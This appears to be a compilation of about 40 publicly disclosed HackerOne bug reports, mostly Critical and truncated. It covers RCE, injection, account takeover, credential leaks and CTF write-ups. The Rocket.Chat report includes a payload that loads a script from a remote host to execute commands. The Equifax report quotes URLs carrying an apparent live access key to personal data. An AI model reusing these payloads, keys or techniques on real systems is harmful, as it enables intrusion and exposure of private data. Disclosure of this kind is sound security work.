# HackerOne 实战案例：uncategorized

_40 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## Remote Code Execution identified on IBM endpoint.
- 等级：Critical | 项目：IBM | 披露：2025-12-31 | CVE：CVE-2025-55182
- 原文：https://hackerone.com/reports/3463045

- - - - - - - - 
Remote Code Execution identified on IBM endpoint was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @dara_7979.
---


## SMTP CRLF Injection in curl/libcurl via MAIL FROM/RCPT TO parameters
- 等级：Critical | 项目：curl | 披露：2025-11-10 | CVE：-
- 原文：https://hackerone.com/reports/3418616

- - - - - - - - 
SMTP CRLF Injection Vulnerability in curl/libcurl
## Vulnerability ID: CURL-SMTP-CRLF-2024
## CWE-93: Improper Neutralization of CRLF Sequences


## Mutation Based Stored XSS on Trix Editor version latest (2.1.8)
- 等级：Critical | 项目：Basecamp | 披露：2025-06-27 | CVE：-
- 原文：https://hackerone.com/reports/2819573

- - - - - - - - 
Heyy there,
I have found a bypass for the sanitizer used in Trix Editor https://github.com/basecamp/trix , the bypass is kind a  of mutation based , using copy paste vector it's possible to perform the xss.
An example payload would be:
[code omitted]
Decoding the html entity you get the below payload ,which contains the mutation xss vector
[code omitted]
For more details on this bypass you can read here: https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
There will exist will more simple vectors this is just an example which worked out of the blue.
-------------------------------------------------
**Steps to reproduce:**
Using the simila


## Weak Rate Limiting Controls in the (LOGIN) page Expose System to Brute Force and DoS Attacks
- 等级：Critical | 项目：Lichess | 披露：2025-05-15 | CVE：-
- 原文：https://hackerone.com/reports/3085889

- - - - - - - - 
## Summary:
The login page lacks proper rate limiting, allowing an attacker to easily perform a brute-force attack. This vulnerability enables the attacker to systematically try different username and password combinations until they successfully compromise any account, which poses a significant security risk.
## Steps To Reproduce:
1.    Navigate to the login page.
2. Attempt login with any valid credentials.
 3.  Capture the request using a proxy tool (e.g., Burp Suite).
  +  Modify the captured request by deleting the token parameter and the cookies to make the request look like this:
====================================================================
POST /login HTTP/2



## low-level p2p ping + tcp flooding leads to a remote crash in monerod
- 等级：Critical | 项目：Monero | 披露：2025-04-14 | CVE：-
- 原文：https://hackerone.com/reports/2858802

- - - - - - - - 
P2P daemon remote crash exploit that could have been scaled up to attack the whole network.
**Summary (researcher):**
total network shutdown
https://x.com/123456
---


## Direct IP Access to Website
- 等级：Critical | 项目：Lichess | 披露：2025-04-11 | CVE：-
- 原文：https://hackerone.com/reports/3068485

- - - - - - - - 
## Summary:
The website is accessible directly via its IP address (37.187.205.99), which may bypass domain-based security policies and expose potential misconfigurations.
## Steps To Reproduce:
1. Open a web browser and enter the IP address:
http://37.187.205.99
2. Observe that it loads the main website instead of rejecting the request or redirecting it to the proper domain.
##Expected Result:
The server should block direct IP access or redirect it to the proper domain.
##Actual Result:
The website is fully accessible via its IP address.
## Impact
1. Domain-based security policies (CSP, HSTS, cookies, etc.) might not be enforced, leading to potential security bypasses.
2. Po


## Weak credentials found in Jenkins endpoint
- 等级：Critical | 项目：IBM | 披露：2025-02-05 | CVE：-
- 原文：https://hackerone.com/reports/2954547

- - - - - - - - 
Weak credentials found in Jenkins endpoint was reported to IBM, analyzed and have been remediated. Thank you to our external researcher @sweetheart1337_.
---


## Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`
- 等级：Critical | 项目：HackerOne | 披露：2025-01-21 | CVE：-
- 原文：https://hackerone.com/reports/1618347

- - - - - - - - 
**Summary:**
Hi team, I understand what's going on
**Description:**
Just a recent update gives the results of private programs


## FULL ACCOUNT TAKEOVER
- 等级：Critical | 项目：MTN | 披露：2024-08-17 | CVE：-
- 原文：https://hackerone.com/reports/2542372

- - - - - - - - 
## Summary:
Using the selfservice portal @ https://mymtn.com.ng/ an attacker can easily takeover any nigerian mtn phone number, and get access to some information, like date of birth, full name, etc. The attacker can also make use of any airtime found on the account.
## Steps To Reproduce:
I have made a detailed video showing the process.
## Impact
Full Access to the Account
Access to some private information, like date of birth, nin, etc
Access to use up all credits and airtime on the account,
Access to modify the data on the account
---


## Authentication bypass in Global Site Selector allows an attacker to log in as any user
- 等级：Critical | 项目：Nextcloud | 披露：2024-01-18 | CVE：CVE-2024-22212
- 原文：https://hackerone.com/reports/2248689

- - - - - - - - 
Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-vj5q-f63m-wp77
---


## Cloudflare CASB Confused Deputy Problem
- 等级：Critical | 项目：Cloudflare | 披露：2023-06-07 | CVE：-
- 原文：https://hackerone.com/reports/1952124

- - - - - - - - 
Cloudflare CASB on a select number of integrations, Microsoft and GitHub, was vulnerable to the confused deputy problem. If an attacker, via a brute force attack or another mechanism, was able to enumerate a valid Microsoft tenant UUID or Microsoft domain, or GitHub installation_id that an existing Cloudflare CASB customer had integrated with, then the attacker would have been able to create a new integration which could surface sensitive information. Cloudflare's CASB engineering team rapidly implemented a fix to disallow the ability to create multiple integrations pointing to the same tenant, thus nullifying the attack as an option. Moreover, an internal investigation did 


## Using special IPv4-mapped IPv6 addresses to bypass local IP ban
- 等级：Critical | 项目：Cloudflare | 披露：2023-01-24 | CVE：-
- 原文：https://hackerone.com/reports/1785260

- - - - - - - - 
By using IPv4-mapped IPv6 addresses there was a way to bypass Cloudflare server's network protections and start connections to ports on the loopback (127.0.0.1) or internal IP addresses (such as 10.0.0.1). The bug was caused by the way a Go library interprets mapped IP addresses and how our code was checking for banned IPs. The code was fixed and now checks both IPv4 and IPv6 properly.
**Summary (researcher):**
Cloudflare has checks in place to block requests destined for banned IP addresses like local and reserved IP ranges. It was possible to bypass these restrictions using proxied AAAA records containing IPv4-mapped IPv6 addresses (e.g. `::ffff:127.0.0.1` and `::ffff:10.0


## Public Github Repo Leaking Internal Credentials
- 等级：Critical | 项目：Yelp | 披露：2022-11-07 | CVE：-
- 原文：https://hackerone.com/reports/1763266

- - - - - - - - 
## Summary:
In Github I found some credentials to use in a mesos.apache.org 
Github:
https://github.com/Yelp/Tron/blob/master/yelp_package/itest_dockerfiles/mesos/mesos-secrets
https://github.com/Yelp/Tron/blob/master/yelp_package/itest_dockerfiles/mesos/mesos-slave-secret
## POC ss
{F2021070}
{F2021071}
Login documentation https://mesos.apache.org
https://mesos.apache.org/documentation/latest/authentication/
## Impact
Unauthorized account access  /information disclosure
---


## No password length restriction in reset password endpoint at http://suppliers.mtn.cm
- 等级：Critical | 项目：MTN | 披露：2022-09-05 | CVE：-
- 原文：https://hackerone.com/reports/1285694

- - - - - - - - 
Hello
## Summary:
I found no password length restriction in reset password endpoint at http://suppliers.mtn.cm when resetting new password
## Steps To Reproduce:
1. Visit https://suppliers.mtn.cm/ and register.
2. logout and reset your password
3. go to your email and click on reset password link
4. enter 150 characters as a password and confirm the characters
5. you will successfully logged in.
## Impact
Attacker can do denial of service to your server since there is no restriction in the length of password.
Example when he enter like 2500 character, your server will crash for some time,
I did not attempt to ddos your server,  because you exclude any activity related to den


## path traversal vulnerability in Grafana 8.x allows " local file read "
- 等级：Critical | 项目：MTN | 披露：2022-09-03 | CVE：-
- 原文：https://hackerone.com/reports/1427086

- - - - - - - - 
Hi team,
I've found a path traversal issue in the Grafana instances hosted on the MTN platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary files on the server.
This IP " 41.242.91.22 " Domain Name " mtn.com.gn "  is for MTN Group 
{F1545670} {F1545682}
##Steps To Reproduce:
1. Open url address  :  http://41.242.91.22:3000/login
{F1545653}
2. File Read server for example /etc/passwd : 
Run the following command on the mac, linux terminal
[code omitted]
Respons:
[code omitted]
3. File Read server  /usr/share/grafana/conf/defaults.ini  :
Grafana config file
[code omitted]
{F1545689}
3. File Read server  /etc/resolv.conf  :
[code omitted


## Race condition in faucet when using starport
- 等级：Critical | 项目：Cosmos | 披露：2022-07-26 | CVE：-
- 原文：https://hackerone.com/reports/1438052

- - - - - - - - 
Hi team, 
I and Aditya sent this bug over email on Wed, 29 Dec, 17:45 IST. Later we noticed that security reports are accepted via the HackerOne program. So, I am sending a copy of the bug report here. 
## Summary:
We were testing an application and we found a race condition bug in the faucet Implementation of Starport. 
https://github.com/tendermint/starport
## Steps To Reproduce:
1. Start a starport with the below configuration. Note the "coins_max" has been set to 11 tokens and hence a user cannot fetch more after the 11 token limits.
[code omitted]
2. Now call the request manually  with 5 tokens per request as in our configuration after 2 requests and 10 tokens in total 


## June 2022 Incident Report
- 等级：Critical | 项目：HackerOne | 披露：2022-07-01 | CVE：-
- 原文：https://hackerone.com/reports/1622449

- - - - - - - - 
# Intro
Since the founding of HackerOne, we have kept a steadfast commitment to disclosing security incidents because we believe that sharing security information far and wide is essential to building a safer internet. HackerOne's culture is to disclose more often, and in more detail than the rest of the industry. This document represents our 431st disclosure to date and we hope it will prove useful to defenders everywhere.
If you were one of the customers directly impacted by this incident, you will have already received direct communication from us providing actionable details.
# Incident Summary
On June 22nd, 2022, a customer asked us to investigate a suspicious vulnerabi


## Misconfigurated login page able to lock login action for any account without user interaction
- 等级：Critical | 项目：Reddit | 披露：2022-06-06 | CVE：-
- 原文：https://hackerone.com/reports/1582778

- - - - - - - - 
## Summary
While observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.
## PoC
1. Save this code as `exploit.py`:
[code omitted]
2. Save this code as `helper.py`:
[code omitted]
3. Download jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)
4. Download a burp which is older than 2021 version (new versions giving too many errors)
5. Set jython 2.7.0 with `Extender > Options > Python Environment > Location of Jyth


## OTP reflecting in response sensitive data exposure leads to account take over
- 等级：Critical | 项目：UPchieve | 披露：2022-03-26 | CVE：-
- 原文：https://hackerone.com/reports/1318087

- - - - - - - - 
## Summary:
Sensitive data that is otp is reflecting in the response of phone number otp verification in https://app.upchieve.org 
## Steps To Reproduce:
  1. Signin with a account
  2.After signin it will ask for phone number for otp verification.
3.Capture the request using burpsuite and see the response 
4.Now otp is exposing in the response.
5.Account take over is happening.
## Impact
Any attacker can login into user account with his/her otp verification which is a high impact of this website.sensitive data is exposing here
---


## Missing ownership check in 2FA for secondary client login
- 等级：Critical | 项目：LY | 披露：2021-12-27 | CVE：-
- 原文：https://hackerone.com/reports/1250474

- - - - - - - - 
Secondary clients such as LINE for Windows/Mac require 2FA at first login. However, due to insufficient verification logic on the server-side, the attacker was able to bypass 2FA after the attacker succeeds QR login by tricking the victim to click a specially crafted URL.
---


## Authentication Bypass - Email Verification code bypass in account registration process.
- 等级：Critical | 项目：UPchieve | 披露：2021-12-07 | CVE：-
- 原文：https://hackerone.com/reports/1406471

- - - - - - - - 
Hi Team,
I was able to bypass Email Verification code in account registration process.
Summary :
Authentication Bypass is a dangerous vulnerability, which is found in Web-Applications. An Attackers can bypass the control mechanisms which are used by the underlying web application like Email verification, OTP, Captcha, 2FA, etc. An Attacker can perform a  complete Account takeover of Victim.
Severity :   High / Critical
Complexity : Easy 
From : Remote / External
Steps to Reproduce:
1- First visit your website "https://hackers.upchieve.org" and request for the sign up.
2- In the second step, choose either you want to register as an academic coach or need an academic coach.
3-


## Unauthorized Kubernetes to RCE (root) and found TEAMTNT Crypto Miner on it
- 等级：Critical | 项目：IBM | 披露：2021-10-18 | CVE：-
- 原文：https://hackerone.com/reports/1317236

- - - - - - - - 
This report revealed a vulnerable server running an unauthorized Kubernetes which allowed un_kn0wn to gain remote code execution. This issue was reported to IBM and has been remediated.
---


## Github access token exposure
- 等级：Critical | 项目：Shopify | 披露：2021-07-26 | CVE：-
- 原文：https://hackerone.com/reports/1087489

- - - - - - - - 
While dissecting an application made by one of your employees I found his GitHub Personal Access Token (PAT), he's a member of the org with pull and push access to all of your repositories. 
As a proof I can tell you that on the repo github.com/Shopify/shopify at commit hash `cea9c273391d` the sha512 of the README.md is `69750574bec56c1f1052db3471252b1daacdc9dda9f6d5332a3400a847fa413ec1caf19ef0b5501f18a5a76c232e7210d5f3b91c24c9439f4e0f64c02d6db824`.
## Impact
Read and write access to all your private github repositories.
On January 26, @augustozanellato reported that while reviewing a public MacOS app, they found a valid GitHub Access Token belonging to a Shopify employee. T


## Pre-Auth Blind NoSQL Injection leading to Remote Code Execution
- 等级：Critical | 项目：Rocket.Chat | 披露：2021-05-18 | CVE：CVE-2021-22911
- 原文：https://hackerone.com/reports/1130721

- - - - - - - - 
**Summary:**
The `getPasswordPolicy` method is vulnerable to NoSQL injection attacks and does not require authentication/authorization. It can be used to take over accounts by leaking password reset tokens. Taking over an admin account leads to Remote Code Execution.
**Description:**
The `getPasswordPolicy` method does not properly validate or sanitize the `token` parameter and can thus be used to perform a blind NoSQL injection. It can be called without authentication (which seems intended), e.g. by using the `/api/v1/method.callAnon` API endpoint
By using [MongoDB's `$regex` operator](https://docs.mongodb.com/manual/reference/operator/query/regex/), a password reset token 


## Broken parsing of Git diff allows an attacker to inject arbitrary Ruby scripts to Casks on official taps
- 等级：Critical | 项目：Homebrew | 披露：2021-04-21 | CVE：-
- 原文：https://hackerone.com/reports/1167608

- - - - - - - - 
## Description
Due to improper parsing of Git diff in [Homebrew/actions/review-cask-pr](https://github.com/Homebrew/actions/tree/336bd2aae5314f8c17c66a8319adeba99f13c093/review-cask-pr), it's possible to confuse parser to ignore additional lines.
Which leads injection of malicious Ruby scripts.
## Root cause
`review-cask-pr` uses the git diff file to check if the pull request is "simple" enough to automatically merge it.
To parse the git diff file, it uses [`git_diff`](https://github.com/anolson/git_diff/) gem with some modifications.
https://github.com/Homebrew/actions/blob/master/review-cask-pr/git_diff_extension.rb
Since `git_diff` has a small bug that allows a crafted di


## hackyholidays CTF Writeup
- 等级：Critical | 项目：h1-ctf | 披露：2021-03-02 | CVE：-
- 原文：https://hackerone.com/reports/1069080

- - - - - - - - 
## Summary:
As per [the referenced blog entry](https://www.hackerone.com/blog/12-days-hacky-holidays-ctf), the Grinch has gone hi-tech this year with the intentions of ruining the holidays. The challenge was about infiltrating the Grinch's network and take it down. 
As outlined on https://hackerone.com/h1-ctf, the domain `hackyholidays.h1ctf.com` was in scope.
It was possible to find multiple vulnerabilities, exploit various applications of the Grinch and finally turn the Grinch's own attack servers against himself by issuing a DDOS attack to `127.0.0.1` and knock him off the internet.
I hope that rebuilding his infrastructure keeps the Grinch busy for a while and gives hack


## It's just a man on a mission
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-12 | CVE：-
- 原文：https://hackerone.com/reports/1069388

- - - - - - - - 
Preface
---------------------
Like any other good stories, this adventure has also begun with a few (long) days of preparation leading up to the start of the challenge. Tools were sharpened, command lines were dusted-off and one-too-many cups of coffee were consumed. The morale was high and the designated day finally arrived.
*Was any of that believable?  If things go south I might as well just start writing novels..dope* 🧐
What really happened was, I started this CTF three days late. I knew about it, but a little bit of procrastination (quite a lot tbh) mixed with a couple of other factors made it so I wasn't going to partake in it. Until one day (on December 15th to be pre


## Wholesome Hacky Holidays: A Writeup
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-12 | CVE：-
- 原文：https://hackerone.com/reports/1066135

- - - - - - - - 
## Flag 1 Warm-up: flag{48104912-28b0-494a-9995-a203d1e261e7}
Checking the `robots.txt` the flag can be found. Also a path is revealed: `/s3cr3t-ar3a`
## Flag 2 It's right in front of you: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
With the previously found path `/s3cr3t-ar3a`, the flag was hidden in plain sight. Opening the dev tools and searching for `flag` reveals it.
## Flag 3 People Rater: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
On the front page a new button `Apps` appeared. One app, the `People Rater` is aviailable. At URL `https://hackyholidays.h1ctf.com/people-rater` we can use the Grinch People Rater by clicking one of the names. For example selecting `Tea Avery


## Writeup Hackyholiday CTF
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-12 | CVE：-
- 原文：https://hackerone.com/reports/1065731

- - - - - - - - 
Hi there,
Find my writeup on attached :) 
{F1128138}
Thanks adam for making the CTF, Really PAIN for my head!
## Impact
Hackerone Hoodie ? 😍😍
---


## Hacky Holidays Writeup
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-12 | CVE：-
- 原文：https://hackerone.com/reports/1067835

- - - - - - - - 
On December 12th, 2020, the CTF became live and the scope that we are allowed to attack was
[code omitted]
Our main motive was to infiltrate his network and take him down. The challenges appeared one by one till 24th of December. Here we will be going through all the steps taken to obtain all the flags.
# TL;DR
{F1133152}
# Detailed
## Flag 1 - KEEP OUT
It all started with hitting `hackyholidays.h1ctf.com`, we are greeted with a KEEP OUT sign. And we are not going to listen to the Grinch. So, on a little bit of enumeration found  `robots.txt`, which often contains some endpoints that can be utilize for further reconnaissance. 
In the `robots.txt`, the first flag was found wi


## Invading Grinch Network and Saving Christmas
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-12 | CVE：-
- 原文：https://hackerone.com/reports/1065829

- - - - - - - - 
#How we saved Christmas
As usual with H1 CTF challenges we are provided with a target URL. In our case it is the following:
https://hackyholidays.h1ctf.com/
We started by visiting the URL and see what is going on. All we could see is a page with an image with a warning message. 
{F1125722}
We quickly view the source code, for any potential hidden hint as a comment. All we could find was some URLs for the hosted content pointing to /assets/ but access there was Forbidden
##**Day 1**
1) We start our enumeration via running a directory enumeration tool.
[code omitted]
2) We get the file /robots.txt in the results. By visiting it we can see the first flag.
`flag{48104912-28b0-49


## Successfully took down the Grinch and saved the holidays from being ruined
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-12 | CVE：-
- 原文：https://hackerone.com/reports/1067530

- - - - - - - - 
Beginning
----------
HackerOne's official twitter account posted a tweet on 11th December announcing 12 days of hacky holidays where we have to take down the grinch and prevent him from ruining the Christmas holidays.
{F1132156}
Challenge 1:  Something to get started
--------------------------------------
 I visited [https://hackerone.com/h1-ctf][1] to understand the scope of the target.
[1]: https://hackerone.com/h1-ctf         "https://hackerone.com/h1-ctf"
The main target is `hackyholidays.h1ctf.com`.  When I visited the website I was presented a page with just an image and a video of snow.
As I do not what kind of web programming language is being used (like php, asp, py


## H1 Hackyholidays CTF - The Grinch was defeated
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-11 | CVE：-
- 原文：https://hackerone.com/reports/1069467

- - - - - - - - 
The following writeup will underline all the steps and tools used to solve the 12 challenges of the H1 Holidays CTF. The theme of the competition was the Grinch. How it is possible to read from the competition blog post https://www.hackerone.com/blog/12-days-hacky-holidays-ctf , the goal was to shut down the grinch network and save the Christmas. Let's get wired! 
I attached a ZIP file containing all the wordlists and the Python scripts in the report.
##Tools used:
For this competition, I made a large use of Burp Suite + Google Chrome, together with some custom Python3 scripts created for some of the challenges.
{F1140318}
#Challenge 1 
In the first challenge (which was not 


## Grinch Networks compromised!
- 等级：Critical | 项目：h1-ctf | 披露：2021-01-11 | CVE：-
- 原文：https://hackerone.com/reports/1066504

- - - - - - - - 
# Grinch Networks compromised!
For fast triage/validation and inspired by @manoelt in other CTF, I made a bash script to find and print all the 12 flags of this CTF.
The script uses curl, wget, google-chrome headless (for flag 2), unzip, grep and sed. If any of these commands is missing, the script might crash or not get all the flags.
[code omitted]
Save it in `get-all-flags.sh`, run `chmod +x get-all-flags.sh; ./get-all-flags.sh`. If all works as expected, this should be the output:
{F1130220}
------------------------
## Flag 1 - robots.txt leak
The first flag was found in the /robots.txt directory by common crawl of burp-suite. Once we navigate to it, there is the flag an


## SQL Injection Union Based
- 等级：Critical | 项目：Automattic | 披露：2021-01-01 | CVE：-
- 原文：https://hackerone.com/reports/1046084

- - - - - - - - 
## Summary:
Hello, 
I have found a SQL Injection Union Based on `https://intensedebate.com/commenthistory/$YourSiteId `
The `$YourSiteId` into the url is vulnerable to SQL Injection.
## Steps to reproduce
1.  Logging into `https://intensedebate.com`
2. After create your own site on `https://intensedebate.com/install` and follow all steps
3. Now you need to know your site id, to get then you need go to `https://intensedebate.com/user-dashboard` and you can see on the right side of the page your site list, choice your site and click to the link `Overview`.
You will be redirected to `https://intensedebate.com/dash/$YourSiteId`.
4. Now you have your site id,  go to the vulnerabl


## Remote Code Execution in Rocket.Chat-Desktop
- 等级：Critical | 项目：Rocket.Chat | 披露：2020-11-07 | CVE：-
- 原文：https://hackerone.com/reports/943725

- - - - - - - - 
**Description:** Rocket.Chat-Desktop is vulnerable to remote code execution.
An attacker is able to create new BrowserWindow instances with a malicious preload script.
## Releases Affected:
  * Rocket.Chat-Desktop-Client: < v3.0.0-develop
## Steps To Reproduce (by setting up a malicious server):
  1. Go to `Administration » Layout » Custom Scripts » Custom Script for Logged In Users`
  1. Insert the following script:
  `window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\45.155.173.235\\data\\cmd.js'].join(','))`
  1. Click `Save changes`
  1. Open Rocket.Chat-Desktop and connect to the server
  1. CMD.exe will pop up.
## Suggested mitigati


## Takeover an account that doesn't have a Shopify ID and more
- 等级：Critical | 项目：Shopify | 披露：2020-09-02 | CVE：-
- 原文：https://hackerone.com/reports/867513

- - - - - - - - 
## Details
The https://pos-channel.shopifycloud.com/graphql-proxy/admin can be exploited to update a staff member email without any email confirmation. 
Using the partner dashboard, we've the ability to create a store that doesn't have a Shopify ID account on https://accounts.shopify.com. By using these two together, all we have to do is create an arbitrary store to an email that we own and confirm it with received email, then use the the POS Staff endpoint to update our email without having to validate it.
You'll then be prompted to create a Shopify ID for your stores (the new created one alongs with the victim stores) and you won't need to validate that you own the email s


## @shakedko H1-2006 CTF writeup
- 等级：Critical | 项目：h1-ctf | 披露：2020-07-06 | CVE：-
- 原文：https://hackerone.com/reports/894623

- - - - - - - - 
## TL;DR
Flag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.
Thank you for this awesome challenge! 
## Introduction
I have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short time. 
Coming from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.
## Tools 
I have used several tools during this process. You may find these tools in the following links:
- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.
- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/). 
- [dex2jar](h


## Subdomain Takeover to Authentication bypass
- 等级：Critical | 项目：Roblox | 披露：2020-04-23 | CVE：-
- 原文：https://hackerone.com/reports/335330

- - - - - - - - 
## Vulnerability Type: 
-----------
Subdomain Takeover
## Description: 
-----------
Due to unclaimed or expired Hubspot instance an attacker is able to claim and serve content from `devrel.roblox.com` and perform different kind of attacks which i shared in impact section.
## Affected Area: 
-----------
http://devrel.roblox.com
## Steps to Reproduce:
-----------
+ Visit: https://devrel.roblox.com/subdomain-takeover
{F283580}
## Mitigation:
-----------
+ Remove the CNAME entry for the `devrel.roblox.com`
## Impact
Let's talk about about in details, as attacker could possible takeover other users account. 
1. As `.ROBLOSECURITY` cookies is scoped to `*.roblox.com` means same co


## Information Leak (Github)
- 等级：Critical | 项目：Equifax-vdp | 披露：2020-04-09 | CVE：-
- 原文：https://hackerone.com/reports/694931

- - - - - - - - 
In Github I found some credentials to use in a webservice that exposes very sensitive information of people, family group, financial situation, and more.
Github:
https://github.com/geraldincg/proyecto/blob/9c89787deb1d217f58b58786d90bfb3eab290237/Proyecto/ViewModels/WebService/ConexionWS.cs
The  webservice is subdomain for Costa Rica:
Change "referencia" identification number to obtain different results.
Example:
https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891550&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=
https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?r

